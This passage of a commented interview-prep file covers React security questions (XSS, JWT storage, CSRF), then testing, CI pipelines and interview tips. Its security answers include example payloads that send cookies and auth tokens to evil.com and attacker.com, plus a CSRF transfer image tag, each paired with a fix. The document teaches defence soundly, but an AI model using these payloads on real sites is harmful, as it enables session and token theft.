   ANSWER:

   React escapes all JSX output by default.
   BUT there are specific escape hatches that bypass this protection.

   VULNERABILITY 1 — dangerouslySetInnerHTML without sanitization:
   ────────────────────────────────────────────────────────────────

        // ❌ VULNERABLE: renders raw HTML directly into the DOM
        const Comment = ({ userContent }) => (
          <div dangerouslySetInnerHTML={{ __html: userContent }} />
        );

        // If userContent = '<img src=x onerror="fetch(`https://evil.com?c=${document.cookie}`)">'
        // Browser executes the script → attacker steals cookies, tokens

        // ✅ FIX: Sanitize with DOMPurify before rendering
        import DOMPurify from 'dompurify';

        const Comment = ({ userContent }) => {
          const sanitized = DOMPurify.sanitize(userContent, {
            ALLOWED_TAGS:  ['b', 'i', 'em', 'strong', 'a', 'p'],
            ALLOWED_ATTR:  ['href', 'target'],
          });
          return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
        };

   VULNERABILITY 2 — href with user-controlled value:
   ────────────────────────────────────────────────────

        // ❌ VULNERABLE: href can contain javascript: protocol
        const UserLink = ({ url }) => (
          <a href={url}>Visit my profile</a>
        );

        // If url = 'javascript:fetch(`https://evil.com?t=${localStorage.token}`)'
        // Clicking the link executes the script

        // ✅ FIX: Validate the URL protocol before rendering
        const UserLink = ({ url }) => {
          const isSafe = (href) => {
            try {
              const parsed = new URL(href);
              return ['https:', 'http:'].includes(parsed.protocol);
            } catch {
              return false; // invalid URL
            }
          };

          if (!isSafe(url)) {
            return <span>Invalid link</span>;
          }
          return (
            <a href={url} target="_blank" rel="noopener noreferrer">
              Visit my profile
            </a>
          );
        };

   VULNERABILITY 3 — Dynamic component or eval-like patterns:
   ────────────────────────────────────────────────────────────

        // ❌ VULNERABLE: evaluating user-supplied code
        const renderDynamic = (userCode) => {
          return eval(userCode);       // executes arbitrary code
          // or: new Function(userCode)();
        };

        // ❌ VULNERABLE: user controls component type
        const components = { div: 'div', MyComp: MyComp };
        const DynamicComp = components[userInput]; // if userInput = 'script'
        return <DynamicComp />;

        // ✅ FIX: Whitelist allowed components
        const ALLOWED_COMPONENTS = { card: CardComp, alert: AlertComp };
        const DynamicComp = ALLOWED_COMPONENTS[userInput];
        if (!DynamicComp) return null;
        return <DynamicComp />;

   DEFENSE IN DEPTH — Content Security Policy:
   ─────────────────────────────────────────────

        // Even if XSS occurs, CSP limits what it can do
        // HTTP Header:
        Content-Security-Policy:
          default-src 'self';
          script-src  'self' 'nonce-{random}';
          connect-src 'self' https://api.example.com;
          // Blocks sending data to evil.com even if script runs
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q2) Your JWT is stored in localStorage. A security audit flags it.
       What are the risks and how do you migrate safely?
   -------------------------------------------------------------------
   ANSWER:

   THE RISK — XSS can steal the token:
   ─────────────────────────────────────

        // Any JavaScript on your page can read localStorage:
        const token = localStorage.getItem('authToken');

        // An XSS attack can do:
        fetch(`https://attacker.com/steal?t=${localStorage.getItem('authToken')}`);

        // With the stolen token, attacker can impersonate the user
        // from their own server — no further access to your site needed

   WHY HttpOnly COOKIES ARE SAFER:
   ─────────────────────────────────

        // HttpOnly cookies are set by the SERVER:
        Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict; Path=/

        // HttpOnly = JavaScript CANNOT read this cookie (not even your own code)
        document.cookie  // won't show HttpOnly cookies
        localStorage     // obviously doesn't have it

        // Browser automatically sends the cookie with every same-origin request
        // No code needed on the frontend to attach auth

   THE MIGRATION — without logging everyone out:
   ──────────────────────────────────────────────

        // PHASE 1: Accept both auth methods on the server
        // Server checks: cookie first, then Authorization header
        // This allows gradual migration

        // PHASE 2: On next login, server issues HttpOnly cookie
        // POST /api/auth/login
        // Response: 200 OK
        // Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict

        // PHASE 3: Frontend stops manually attaching the token
        // ❌ Before
        axios.defaults.headers.common['Authorization'] =
          `Bearer ${localStorage.getItem('authToken')}`;

        // ✅ After — browser sends cookie automatically
        axios.defaults.withCredentials = true;
        // That's all — no manual token handling

        // PHASE 4: Clean up old localStorage tokens
        useEffect(() => {
          // On app boot — remove old token if new cookie auth is active
          if (document.cookie.includes('auth_token')) {
            localStorage.removeItem('authToken');
          }
        }, []);

        // PHASE 5: After N weeks, remove backwards compatibility
        // Server stops accepting Authorization header

   CSRF — THE NEW RISK INTRODUCED BY COOKIES:
   ────────────────────────────────────────────

        // Cookies are automatically sent to your domain from ANY site
        // A malicious site could make a POST to your API
        // and the cookie would be attached → CSRF attack

        // FIX 1: SameSite=Strict (best, simplest)
        // Cookie only sent for same-site requests
        // Cross-site requests won't include the cookie

        // FIX 2: CSRF token (if SameSite isn't enough)
        // Server sends a CSRF token in a non-HttpOnly cookie
        // Frontend reads it and sends as a header
        // Server validates header matches cookie
        axios.defaults.headers['X-CSRF-Token'] =
          getCookieValue('csrf_token'); // readable because NOT HttpOnly
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q3) What's the difference between XSS and CSRF?
       What does HttpOnly protect against and what doesn't it?
   -------------------------------------------------------------------
   ANSWER:

   XSS — CROSS-SITE SCRIPTING:
   ─────────────────────────────
        Attack vector: attacker injects malicious JS into YOUR page
        Executed by:   victim's browser, on YOUR domain
        Goal:          steal data, tokens, cookies, keystrokes
                       make requests as the user from within your page

        Example:
          1. Attacker finds unsanitized comment input on your site
          2. Posts comment: <script>sendCookies(document.cookie)</script>
          3. Every user who views the comment page executes the script

        What HttpOnly protects:
        ✅ HttpOnly cookies — JS can't read them
           So even if XSS runs, it can't steal the auth cookie directly

        What HttpOnly does NOT protect:
        ❌ XSS can still USE the cookie by making requests from your domain
           fetch('/api/transfer-money', { credentials: 'include' })
           Cookie is attached automatically — attacker can act as the user
        ❌ Can still steal non-HttpOnly cookies
        ❌ Can still read localStorage, session storage
        ❌ Can still read visible page content, keystrokes

   CSRF — CROSS-SITE REQUEST FORGERY:
   ─────────────────────────────────────
        Attack vector: attacker tricks victim into making a request
                       to YOUR site FROM a different (malicious) site
        Executed by:   victim's browser, triggered from ATTACKER's site
        Goal:          perform actions on victim's behalf

        Example:
          1. Victim is logged into bank.com
          2. Victim visits evil.com
          3. evil.com has hidden: <img src="https://bank.com/transfer?to=attacker&amt=1000">
          4. Browser makes GET request to bank.com with auth cookie attached
          5. Bank processes transfer (if no CSRF protection)

        What HttpOnly protects:
        ❌ Does NOT protect against CSRF
           HttpOnly just stops JS from reading cookies
           Browser still sends them with cross-site requests

        What DOES protect against CSRF:
        ✅ SameSite=Strict — browser won't send cookie for cross-site requests
        ✅ CSRF tokens — random token server validates on every state change

   SIDE-BY-SIDE SUMMARY:
   ──────────────────────
        ┌────────────────┬───────────────────────┬─────────────────────────┐
        │                │ XSS                   │ CSRF                    │
        ├────────────────┼───────────────────────┼─────────────────────────┤
        │ Origin of code │ Your domain           │ Attacker's domain       │
        │ Executes in    │ Victim's browser      │ Victim's browser        │
        │ HttpOnly helps │ Partially (can't read)│ No (cookie still sent)  │
        │ Main fix       │ Input sanitization,   │ SameSite=Strict,        │
        │                │ CSP, output encoding  │ CSRF tokens             │
        └────────────────┴───────────────────────┴─────────────────────────┘
   -------------------------------------------------------------------*/


/* ===================================================================
   SECTION 5 — TESTING & CI/CD
=================================================================== */


/* -------------------------------------------------------------------
   Q1) You need to add tests to a legacy codebase with zero coverage.
       Where do you start?
   -------------------------------------------------------------------
   ANSWER:

   DON'T try to get to 100% coverage — you'll burn out and write bad tests.
   Be STRATEGIC. Ask: what costs the most when it breaks?

   PRIORITY ORDER (highest ROI first):
   ─────────────────────────────────────

        Priority 1 → Critical user paths (login, checkout, payment)
                     Write E2E tests with Playwright or Cypress
                     These catch the regressions that lose money

        Priority 2 → Pure utility / helper functions
                     calculateDiscount(), formatDate(), validateEmail()
                     Easy to test, high bug density, no rendering needed

        Priority 3 → Complex components with business logic
                     Multi-step forms, date pickers, permission checks
                     Write integration tests with React Testing Library

        Priority 4 → Simple presentational components
                     <Button />, <Avatar />, <Badge />
                     Lowest risk, lowest ROI — test last or skip

   THE GOLDEN RULE — test behavior, not implementation:
   ──────────────────────────────────────────────────────

        // ❌ Implementation test (Enzyme style)
        // Breaks on ANY refactor even if behavior is identical
        expect(wrapper.find('Input').prop('value')).toBe('hello');
        expect(wrapper.state('isLoading')).toBe(false);
        wrapper.instance().handleSubmit();

        // ✅ Behavior test (React Testing Library)
        // Tests what USERS experience — survives refactors
        import { render, screen } from '@testing-library/react';
        import userEvent from '@testing-library/user-event';

        test('user can log in with valid credentials', async () => {
          render(<LoginForm />);

          // Interact like a user would
          await userEvent.type(
            screen.getByLabelText('Email'),
            'user@example.com'
          );
          await userEvent.type(
            screen.getByLabelText('Password'),
            'password123'
          );
          await userEvent.click(
            screen.getByRole('button', { name: /sign in/i })
          );

          // Assert what the user sees
          await waitFor(() => {
            expect(screen.getByText('Welcome back!')).toBeInTheDocument();
          });
        });

   CHARACTERIZATION TESTS — understand before refactoring:
   ─────────────────────────────────────────────────────────

        // When you don't know what legacy code SHOULD do,
        // write tests that document what it CURRENTLY does.
        // These protect against unintentional behavior change.

        test('processOrder returns X for input Y (characterization)', () => {
          // Don't know if this is right — just documenting current behavior
          expect(processOrder({ qty: 0, price: 10 })).toEqual({
            total: 0,
            tax: 0,
            status: 'empty'
          });
        });
        // Later you can update these when you understand the correct behavior
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q2) A flaky test fails 1 in 10 times in CI but never locally.
       How do you diagnose and fix it?
   -------------------------------------------------------------------
   ANSWER:

   CAUSE 1 — Race condition (most common):
   ─────────────────────────────────────────

        // ❌ Flaky: asserting before async operation completes
        fireEvent.click(submitButton);
        expect(screen.getByText('Success')).toBeInTheDocument();
        // Sometimes passes (fast machine), sometimes fails (slower CI)

        // ✅ Fix: properly await the async change
        fireEvent.click(submitButton);
        await waitFor(() => {
          expect(screen.getByText('Success')).toBeInTheDocument();
        }, { timeout: 5000 }); // generous timeout for CI

        // ✅ Or use findBy* which auto-waits:
        const successMsg = await screen.findByText('Success');
        expect(successMsg).toBeInTheDocument();

   CAUSE 2 — Test order dependency (tests share state):
   ──────────────────────────────────────────────────────

        // ❌ Test B depends on Test A having run first
        test('A: user logs in', () => { login('user@test.com'); });
        test('B: user sees dashboard', () => {
          // Assumes A ran first and set some global state
          expect(screen.getByText('Dashboard')).toBeInTheDocument();
        });

        // ✅ Fix: each test is completely independent
        beforeEach(() => {
          jest.clearAllMocks();
          localStorage.clear();
          // Reset any module-level state
          store.dispatch(resetState());
        });

        test('B: user sees dashboard after login', async () => {
          // Sets up its own state — doesn't depend on another test
          renderWithAuth(<Dashboard />, { user: mockUser });
          expect(screen.getByText('Dashboard')).toBeInTheDocument();
        });

   CAUSE 3 — Time-dependent logic:
   ──────────────────────────────────

        // ❌ Flaky: test passes at 11:59pm, fails at midnight
        const isExpired = (date) => date < new Date();
        test('shows expired badge', () => {
          render(<Token expiryDate={new Date()} />);
          expect(screen.getByText('Expired')).toBeInTheDocument();
          // new Date() in component vs new Date() in test = different ms
        });

        // ✅ Fix: freeze time with fake timers
        beforeEach(() => {
          jest.useFakeTimers();
          jest.setSystemTime(new Date('2024-06-15T12:00:00.000Z'));
        });
        afterEach(() => jest.useRealTimers());

        test('shows expired badge', () => {
          const pastDate = new Date('2024-06-14'); // clearly in the past
          render(<Token expiryDate={pastDate} />);
          expect(screen.getByText('Expired')).toBeInTheDocument();
        });

   CAUSE 4 — CI machine is slower (timeout too tight):
   ──────────────────────────────────────────────────────

        // ❌ Works on M2 Mac, fails on CI's shared Linux runner
        await waitFor(() => {
          expect(screen.getByText('Loaded')).toBeInTheDocument();
        }); // default timeout: 1000ms — too short for CI

        // ✅ Fix: increase timeout for integration/E2E tests
        await waitFor(() => {
          expect(screen.getByText('Loaded')).toBeInTheDocument();
        }, { timeout: 10000 }); // 10 seconds for CI

        // Or globally in jest.config.js:
        testTimeout: 15000

   HOW TO FIND FLAKY TESTS SYSTEMATICALLY:
   ──────────────────────────────────────────

        # Run test in isolation multiple times to confirm it's flaky
        npx jest --testNamePattern="test name" --count=20

        # Jest --randomize flag — run tests in random order
        # Exposes order-dependent failures
        npx jest --randomize

        # In CI — add retry logic for known flaky tests
        # jest-circus supports retry:
        jest.retryTimes(2); // retry failing test up to 2 times
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q3) What is the testing trophy vs testing pyramid?
       What's the right ratio of each type of test?
   -------------------------------------------------------------------
   ANSWER:

   TESTING PYRAMID (Traditional / older view):
   ──────────────────────────────────────────────
        Many unit tests (base)
        Some integration tests
        Few E2E tests (top)

        Reasoning:
        • Unit tests are fast and cheap
        • E2E tests are slow and brittle

        Problem with over-indexing on unit tests:
        • Tests are coupled to implementation details
        • Refactor the internals (not behavior) → 50 tests break
        • High coverage but bugs still slip through
          because no test covers how units interact

   TESTING TROPHY (Kent C. Dodds / React Testing Library philosophy):
   ────────────────────────────────────────────────────────────────────

        Static analysis  (smallest, at the bottom)
            TypeScript, ESLint — catches type errors and syntax issues
            Cost: nearly free, runs in background

        Unit tests (small layer)
            Pure utility functions, hooks in isolation
            calculateTax(), formatCurrency(), useDebounce()
            Fast, simple, test one thing

        Integration tests (biggest layer — the sweet spot)
            Component + its children + its hooks + API mocks
            Test a real user flow: fill form → submit → see result
            Best ROI: realistic without being slow/brittle

        E2E tests (top, small layer)
            Real browser, real server (or staging)
            Critical paths only: login, checkout, signup, payment
            Playwright or Cypress

   PRACTICAL RATIO FOR A MID-SIZE APP:
   ──────────────────────────────────────

        Static (TypeScript + ESLint)  → 100% of code
        Unit tests                    → ~20% of test effort
                                        utilities, pure functions, helpers
        Integration tests             → ~60% of test effort
                                        components, pages, user flows
        E2E tests                     → ~20% of test effort
                                        5-10 critical path journeys

   WHAT EACH TYPE CATCHES (AND MISSES):
   ──────────────────────────────────────

        Unit tests catch:
        ✅ Bugs in isolated logic
        ❌ Integration bugs (module A works, module B works, A+B broken)
        ❌ Environment/browser compatibility issues

        Integration tests catch:
        ✅ Component + hook interaction bugs
        ✅ State management bugs
        ✅ Accessibility issues (can screen reader find this button?)
        ❌ Network/infrastructure issues
        ❌ Multi-page flows

        E2E tests catch:
        ✅ Full user journey bugs
        ✅ Auth flow issues
        ✅ Cross-page state bugs
        ❌ Edge cases (too slow to test every variant)
        ❌ Precise styling/layout issues

   THE RULE:
   • Write tests at the LOWEST level that gives you confidence
   • If an integration test covers it, don't also write a unit test for it
   • If E2E covers it, don't also write an integration test for it
   -------------------------------------------------------------------*/


/* -------------------------------------------------------------------
   Q4) How do you set up a CI pipeline that gives
       fast developer feedback?
   -------------------------------------------------------------------
   ANSWER:

   THE CORE PRINCIPLE:
   • Fast feedback on every change (failing fast = less context-switching)
   • Don't run everything on every event — tier your pipeline
   • Developer should know within 2 minutes if their commit broke something

   PIPELINE STRUCTURE:
   ────────────────────

        ON EVERY COMMIT (any branch):
        ───────────────────────────────
        Stage 1 — Static analysis     (~30 seconds)
          • ESLint           — catch code style and potential bugs
          • TypeScript check — catch type errors
          • Prettier check   — catch formatting inconsistencies
          If any fail → block immediately, no point running tests

        Stage 2 — Unit tests          (~1-2 minutes)
          • Jest unit tests (pure functions, utilities, hooks)
          • Run in parallel with --maxWorkers=4
          • If fail → block immediately

        ON PULL REQUEST TO MAIN:
        ─────────────────────────
        Stage 3 — Integration tests   (~5-8 minutes)
          • React Testing Library component tests
          • API integration tests with mocked server
          • Run in parallel (split by folder/file)

        Stage 4 — Build + Size check  (~2 minutes)
          • Build the production bundle
          • size-limit check — fail if bundle > threshold
          • Lighthouse CI — fail if Core Web Vitals regress

        Stage 5 — Visual regression   (~5 minutes, optional)
          • Chromatic / Percy snapshot comparison
          • Flag visual changes for design review

        ON MERGE TO MAIN:
        ──────────────────
        Stage 6 — E2E tests           (~15-20 minutes)
          • Playwright against staging environment
          • Test critical paths only (login, checkout, signup)
          • Run in parallel across multiple workers

        Stage 7 — Deploy to staging
          • Automatic deploy after all tests pass

        ON MANUAL APPROVAL:
        ────────────────────
        Stage 8 — Deploy to production
          • Smoke tests after deploy (5 key pages load, no JS errors)
          • Automatic rollback if smoke tests fail

   EXAMPLE GITHUB ACTIONS STRUCTURE:
   ────────────────────────────────────

        # .github/workflows/ci.yml
        jobs:
          lint:
            runs-on: ubuntu-latest
            steps:
              - run: npm run lint
              - run: npm run type-check

          unit-tests:
            needs: lint           # only run if lint passes
            runs-on: ubuntu-latest
            steps:
              - run: npm test -- --ci --coverage

          integration-tests:
            needs: unit-tests
            runs-on: ubuntu-latest
            strategy:
              matrix:
                shard: [1, 2, 3]  # run tests in 3 parallel workers
            steps:
              - run: npm test -- --shard=${{ matrix.shard }}/3

          e2e:
            needs: integration-tests
            if: github.ref == 'refs/heads/main'  # only on merge
            steps:
              - run: npx playwright test

   KEY METRICS TO AIM FOR:
   • Lint + unit tests:     < 3 minutes   (developer waits for this)
   • Integration tests:     < 8 minutes   (developer waits for this)
   • E2E tests:             < 20 minutes  (runs in background)
   -------------------------------------------------------------------*/


/* ===================================================================
   CROSS-CUTTING — HOW TO ANSWER IN AN INTERVIEW
===================================================================

   FRAMEWORK FOR EVERY ANSWER:
   ─────────────────────────────

        1. DIAGNOSE FIRST (don't jump to solutions)
           "Before reaching for X, I'd first look at Y to understand
           if this is actually the root cause..."

        2. TECHNICAL APPROACH (step by step)
           "My approach would be:
            First... Then... Finally..."

        3. TRADEOFFS (always have a "but")
           "This solution works well BUT it adds complexity,
           so I'd only reach for it after confirming..."

        4. MEASURE / MONITOR (how do you know it worked?)
           "After implementing, I'd verify by... and monitor..."

   SIGNALS INTERVIEWERS LOOK FOR AT MID-LEVEL:
   ─────────────────────────────────────────────

        ✓ Can you solve a problem WITHOUT being told exactly what to do?
        ✓ Do you understand WHY, not just WHAT?
        ✓ Do you know the tradeoffs of your choices?
        ✓ Have you actually done this? (mention specific tools, surprises)
        ✓ Can you communicate technical ideas clearly?

   RED FLAGS TO AVOID:
   ────────────────────

        ✗ "I'd just Google it" (everyone does, don't say it)
        ✗ Jumping to a solution without diagnosing
        ✗ "I'd use Redux" for every state problem
        ✗ No tradeoffs mentioned (perfect solutions don't exist)
        ✗ Textbook answers with no real examples

   PHRASES THAT SIGNAL SENIORITY:
   ───────────────────────────────

        "It depends on..."        → shows you understand context matters
        "I'd measure first..."    → shows you don't optimize blindly
        "The tradeoff here is..." → shows system thinking
        "We ran into this and..." → shows real experience
        "I'd start small and..."  → shows pragmatism over perfection

=================================================================== */
